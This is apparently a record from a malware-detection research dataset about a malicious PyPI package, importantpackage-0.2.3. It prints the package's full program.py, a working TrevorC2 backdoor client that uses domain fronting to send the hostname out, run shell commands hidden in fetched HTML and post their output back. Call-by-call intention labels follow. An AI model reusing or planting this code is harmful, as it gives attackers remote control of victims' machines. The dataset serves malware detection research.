{
  "metadata": {
    "package_name": "importantpackage-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/importantpackage-0.2.3.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "program.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/importantpackage-0.2.3/importantpackage-0.2.3/importantpackage/program.py",
      "code_snippets": [
        {
          "snippet": "# Malicious imports and constants\nimport datetime\nfrom urllib import request\nimport ssl\nimport random\nimport base64\nimport time\nimport subprocess\nimport platform\nimport json\nimport sys\n\nSITE_URL = (\"https://pypi.python.org\")\nROOT_PATH_QUERY = (\"/\")\nSITE_PATH_QUERY = (\"/images\")\nQUERY_STRING = (\"guid=\")\nSTUB = (\"oldcss=\")\ntime_interval1 = 2\ntime_interval2 = 8\nHOST_HEADER = (\"psec.forward.io.global.prod.fastly.net\")\nminutes_from_now = 5\nminutes_until_expiry = datetime.datetime.now() + datetime.timedelta(minutes = minutes_from_now)\n\ndef not_yet_expired():\n    return datetime.datetime.now() <= minutes_until_expiry\n\nclass Request:\n    def __init__(self):\n        self.ctx = ssl.create_default_context()\n        self.ctx.check_hostname = False\n        self.ctx.verify_mode = ssl.CERT_NONE\n        self.cookie_processor = request.HTTPCookieProcessor()\n\n    def get(self, url):\n        r = request.Request(url, headers = {'Host': HOST_HEADER})\n        opener = request.build_opener(self.cookie_processor)\n        res = opener.open(r, timeout = 5)\n        return res.read()\n\n    def post(self, url, data):\n        data = json.dumps({\"output\": data})\n        encoded = base64.urlsafe_b64encode(data.encode(\"utf-8\"))\n        r = request.Request(url, data = encoded, headers = {'Host': HOST_HEADER})\n        opener = request.build_opener(self.cookie_processor)\n        res = opener.open(r, timeout = 5)\n        return res.read()\n\ndef random_interval(time_interval1, time_interval2):\n    return random.randint(time_interval1, time_interval2)\n\nhostname = platform.node()\nreq = Request()\n\ndef connect_trevor():\n    while not_yet_expired():\n        time.sleep(1)\n        try:\n            hostname_send  = (\"magic_hostname=\" + hostname).encode('utf-8')\n            hostname_send = str(base64.b64encode(hostname_send).decode('utf-8'))\n            html = req.get(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send)\n            print(html)\n            break\n        except Exception as error:\n            if \"Connection refused\" in str(error):\n                print(str(error))\n                pass\n            else:\n                print(\"[!] Something went wrong in connecting, printing error: \" + str(error))\n\nconnect_trevor()\n\nwhile not_yet_expired():\n    try:\n        time.sleep(random_interval(time_interval1, time_interval2))\n        html = req.get(SITE_URL + ROOT_PATH_QUERY)\n        parse = html.decode().split(\"<!-- %s\" % (STUB))[1].split(\"-->\")[0]\n        parse = parse.replace(\"'\", \"\")\n        parse = parse.replace('\"', \"\")\n        if parse == \"nothing\": pass\n        else:\n            if hostname in parse:\n                parse = parse.split(hostname + \"::::\")[1]\n                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                stdout_value = proc.communicate()[0]\n                stdout_value = (hostname + \"::::\" + str(stdout_value)).encode('utf-8')\n                stdout_value = base64.b64encode(stdout_value).decode('utf-8')\n                html = req.post(SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data = stdout_value)\n                time.sleep(random_interval(time_interval1, time_interval2))\n    except Exception as error:\n        if \"Connection refused\" in str(error):\n            connect_trevor()\n        else:\n            print(\"[!] Something went wrong in polling, printing error: \" + str(error))\n    except KeyboardInterrupt:\n        print (\"\\n[!] Exiting TrevorC2 Client...\")\n        sys.exit()\n",
          "triple_sequences": [
            {
              "action_api": "datetime.datetime.now()",
              "action_description": "Returns current time",
              "action_id": "get_current_time",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "datetime.timedelta()",
              "action_description": "Parses string into datetime object",
              "action_id": "parse_datetime",
              "object": "minutes = minutes_from_now",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "ssl.create_default_context()",
              "action_description": "Creates SSL context with specified protocol",
              "action_id": "create_ssl_context",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Establish connection",
              "intention_id": "establish_connection"
            },
            {
              "action_api": "request.HTTPCookieProcessor()",
              "action_description": "Configures proxy handler for HTTP requests",
              "action_id": "configure_proxy_handler",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "request.Request()",
              "action_description": "Creates HTTP request object with specified URL, data, and headers",
              "action_id": "create_http_request",
              "object": "url, headers = {'Host': HOST_HEADER}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "request.build_opener()",
              "action_description": "Builds opener object with specified handler",
              "action_id": "build_opener",
              "object": "self.cookie_processor",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "opener.open()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "r, timeout = 5",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "res.read()",
              "action_description": "Process HTTP response content",
              "action_id": "process_http_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode downloaded content",
              "intention_id": "decode_downloaded_content"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "{\"output\": data}",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "data, \"utf-8\"",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "base64.urlsafe_b64encode()",
              "action_description": "Encodes bytes to base64-encoded bytes",
              "action_id": "encode_bytes_to_base64",
              "object": "data.encode(\"utf-8\")",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare base64-encoded data for transmission",
              "intention_id": "prepare_base64_data_transmission"
            },
            {
              "action_api": "request.Request()",
              "action_description": "Creates HTTP request object with specified URL, data, and headers",
              "action_id": "create_http_request",
              "object": "url, data = encoded, headers = {'Host': HOST_HEADER}",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "request.build_opener()",
              "action_description": "Builds opener object with specified handler",
              "action_id": "build_opener",
              "object": "self.cookie_processor",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "opener.open()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "r, timeout = 5",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "res.read()",
              "action_description": "Process HTTP response content",
              "action_id": "process_http_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode downloaded content",
              "intention_id": "decode_downloaded_content"
            },
            {
              "action_api": "random.randint()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "time_interval1, time_interval2",
              "object_description": "Delay interval value",
              "object_id": "delay_interval",
              "intention_description": "Generate random number",
              "intention_id": "generate_random_number"
            },
            {
              "action_api": "platform.node()",
              "action_description": "Retrieves machine node name",
              "action_id": "get_machine_node",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system hostname",
              "intention_id": "get_system_hostname"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "1",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Pause execution",
              "intention_id": "pause_execution"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "(\"magic_hostname=\" + hostname), 'utf-8'",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "base64.b64encode()",
              "action_description": "Encodes bytes to base64-encoded bytes",
              "action_id": "encode_bytes_to_base64",
              "object": "hostname_send",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare base64-encoded data for transmission",
              "intention_id": "prepare_base64_data_transmission"
            },
            {
              "action_api": "bytes.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "req.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING + hostname_send",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "print()",
              "action_description": "Prints output to standard output",
              "action_id": "get_stdout_stream",
              "object": "html",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access attribute value",
              "intention_id": "access_attribute_value"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "random_interval(time_interval1, time_interval2)",
              "object_description": "Delay interval value",
              "object_id": "delay_interval",
              "intention_description": "Pause execution",
              "intention_id": "pause_execution"
            },
            {
              "action_api": "req.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "SITE_URL + ROOT_PATH_QUERY",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "bytes.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "str.split()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "\"<!-- %s\" % (STUB)",
              "object_description": "Obfuscated string",
              "object_id": "obfuscated_string",
              "intention_description": "Prepare string processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "str.split()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "\"-->\"",
              "object_description": "Obfuscated string",
              "object_id": "obfuscated_string",
              "intention_description": "Prepare string processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "str.replace()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "'",
              "object_description": "Obfuscated string",
              "object_id": "obfuscated_string",
              "intention_description": "Prepare string processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "str.replace()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "\"",
              "object_description": "Obfuscated string",
              "object_id": "obfuscated_string",
              "intention_description": "Prepare string processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "str.split()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "hostname + \"::::\"",
              "object_description": "Obfuscated string",
              "object_id": "obfuscated_string",
              "intention_description": "Prepare string processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "proc.communicate()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "hostname + \"::::\" + str(stdout_value), 'utf-8'",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "base64.b64encode()",
              "action_description": "Encodes bytes to base64-encoded bytes",
              "action_id": "encode_bytes_to_base64",
              "object": "stdout_value",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare base64-encoded data for transmission",
              "intention_id": "prepare_base64_data_transmission"
            },
            {
              "action_api": "bytes.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "req.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "SITE_URL + SITE_PATH_QUERY + \"?\" + QUERY_STRING, data = stdout_value",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "random_interval(time_interval1, time_interval2)",
              "object_description": "Delay interval value",
              "object_id": "delay_interval",
              "intention_description": "Pause execution",
              "intention_id": "pause_execution"
            },
            {
              "action_api": "print()",
              "action_description": "Prints output to standard output",
              "action_id": "get_stdout_stream",
              "object": "\"[!] Something went wrong in polling, printing error: \" + str(error)",
              "object_description": "Error message text",
              "object_id": "error_message",
              "intention_description": "Access attribute value",
              "intention_id": "access_attribute_value"
            },
            {
              "action_api": "sys.exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            }
          ]
        }
      ]
    }
  ]
}